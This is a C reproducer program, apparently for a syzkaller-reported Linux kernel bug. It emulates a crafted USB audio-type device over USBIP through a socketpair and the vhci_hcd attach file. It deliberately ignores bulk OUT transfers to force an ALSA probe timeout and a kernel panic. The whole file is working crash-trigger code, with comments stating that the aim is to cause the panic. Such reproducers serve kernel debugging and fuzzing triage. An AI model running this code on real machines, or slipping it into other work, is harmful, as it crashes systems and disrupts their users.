// https://syzkaller.appspot.com/bug?id=0a0756be604796c0bf7185859a5457907c7539d2
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>

// USBIP protocol headers (Big Endian)
struct usbip_header {
    uint32_t command;
    uint32_t seqnum;
    uint32_t devid;
    uint32_t direction;
    uint32_t ep;
    union {
        struct {
            uint32_t transfer_flags;
            int32_t transfer_buffer_length;
            int32_t start_frame;
            int32_t number_of_packets;
            int32_t interval;
            unsigned char setup[8];
        } cmd_submit;
        struct {
            int32_t status;
            int32_t actual_length;
            int32_t start_frame;
            int32_t number_of_packets;
            int32_t error_count;
        } ret_submit;
        struct {
            uint32_t seqnum;
        } cmd_unlink;
        struct {
            int32_t status;
        } ret_unlink;
    } u;
} __attribute__((packed));

static const uint8_t dev_desc[] = {
    18, 1, 0x00, 0x02, 0, 0, 0, 64, 0x12, 0x34, 0x56, 0x78, 0x00, 0x01, 0, 0, 0, 1
};

static const uint8_t conf_desc[] = {
    9, 2, 58, 0, 1, 1, 0, 0x80, 50,
    9, 4, 0, 0, 0, 1, 3, 0, 0,
    9, 4, 0, 1, 2, 1, 3, 0, 0,
    7, 0x24, 0x01, 0x00, 0x02, 7, 0,
    7, 5, 0x01, 2, 64, 0, 0,
    5, 0x25, 0x02, 1, 1,
    7, 5, 0x82, 2, 64, 0, 0,
    5, 0x25, 0x02, 1, 1
};

static const uint8_t gtb_desc[] = {
    5, 0x26, 0x01, 18, 0,
    13, 0x26, 0x02, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0
};

void *usbip_server(void *arg) {
    int fd = (int)(long)arg;
    struct usbip_header req;

    printf("[*] USBIP server thread started.\n");

    while (1) {
        int done = 0;
        while (done < sizeof(req)) {
            int r = read(fd, ((char*)&req) + done, sizeof(req) - done);
            if (r <= 0) {
                printf("[-] USBIP server read failed or EOF.\n");
                return NULL;
            }
            done += r;
        }

        uint32_t cmd = ntohl(req.command);
        uint32_t seqnum = ntohl(req.seqnum);
        uint32_t ep = ntohl(req.ep);
        uint32_t dir = ntohl(req.direction);

        if (cmd == 1) { // USBIP_CMD_SUBMIT
            int32_t tlen = ntohl(req.u.cmd_submit.transfer_buffer_length);
            if (dir == 0 && tlen > 0) {
                char *buf = malloc(tlen);
                if (!buf) {
                    printf("[-] USBIP server malloc failed.\n");
                    return NULL;
                }
                int done_data = 0;
                while (done_data < tlen) {
                    int r = read(fd, buf + done_data, tlen - done_data);
                    if (r <= 0) {
                        free(buf);
                        return NULL;
                    }
                    done_data += r;
                }
                free(buf);
            }

            if (ep != 0) {
                // DO NOT reply to Bulk OUT (triggers the timeout & BUG)
                continue;
            }

            uint8_t req_type = req.u.cmd_submit.setup[0];
            uint8_t b_req = req.u.cmd_submit.setup[1];
            uint16_t w_val = req.u.cmd_submit.setup[2] | (req.u.cmd_submit.setup[3] << 8);
            uint16_t w_len = req.u.cmd_submit.setup[6] | (req.u.cmd_submit.setup[7] << 8);

            const uint8_t *data = NULL;
            int len = 0;
            int status = 0;

            if (req_type == 0x80 && b_req == 6) {
                if ((w_val >> 8) == 1) { data = dev_desc; len = sizeof(dev_desc); }
                else if ((w_val >> 8) == 2) { data = conf_desc; len = sizeof(conf_desc); }
                else { status = -32; } // -EPIPE
            } else if (req_type == 0x81 && b_req == 6 && (w_val >> 8) == 0x26) {
                data = gtb_desc; len = sizeof(gtb_desc);
            } else if (req_type == 0x80 && b_req == 0) { // GET_STATUS
                static const uint8_t status_data[] = {0, 0};
                data = status_data; len = 2;
            } else if (req_type == 0x00 && b_req == 9) { // SET_CONFIGURATION
                len = 0;
            } else if (req_type == 0x01 && b_req == 11) { // SET_INTERFACE
                len = 0;
            } else {
                status = -32; // -EPIPE
            }

            if (len > w_len) len = w_len;
            if (status != 0) len = 0;

            struct usbip_header rep;
            memset(&rep, 0, sizeof(rep));
            rep.command = htonl(3); // USBIP_RET_SUBMIT
            rep.seqnum = htonl(seqnum);
            rep.direction = htonl(dir);
            rep.u.ret_submit.status = htonl(status);
            rep.u.ret_submit.actual_length = htonl(len);

            if (write(fd, &rep, sizeof(rep)) != sizeof(rep)) {
                printf("[-] USBIP server write header failed.\n");
                return NULL;
            }
            if (dir == 1 && len > 0) {
                if (write(fd, data, len) != len) {
                    printf("[-] USBIP server write data failed.\n");
                    return NULL;
                }
            }
        } else if (cmd == 2) { // USBIP_CMD_UNLINK
            struct usbip_header rep;
            memset(&rep, 0, sizeof(rep));
            rep.command = htonl(4); // USBIP_RET_UNLINK
            rep.seqnum = htonl(seqnum);
            rep.direction = htonl(dir);
            rep.u.ret_unlink.status = htonl(0);

            if (write(fd, &rep, sizeof(rep)) != sizeof(rep)) {
                printf("[-] USBIP server write unlink reply failed.\n");
                return NULL;
            }
        }
    }
    return NULL;
}

int main() {
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
        printf("[-] Failed to create socketpair: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] socketpair successful.\n");

    pthread_t tid;
    if (pthread_create(&tid, NULL, usbip_server, (void *)(long)sv[1]) != 0) {
        printf("[-] Failed to create thread: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] pthread_create successful.\n");

    char buf[256];
    snprintf(buf, sizeof(buf), "0 %d 0 3", sv[0]);
    int fd = open("/sys/devices/platform/vhci_hcd.0/attach", O_WRONLY);
    if (fd < 0) {
        printf("[-] Failed to open attach file: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] open attach file successful.\n");

    if (write(fd, buf, strlen(buf)) < 0) {
        printf("[-] Failed to write to attach file: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] write to attach file successful.\n");
    close(fd);

    printf("[*] Waiting for ALSA probe timeout and subsequent panic...\n");
    sleep(10); // Wait for ALSA probe timeout and subsequent panic
    printf("[+] Sleep finished. If no panic occurred, the bug might not be triggered.\n");
    return 0;
}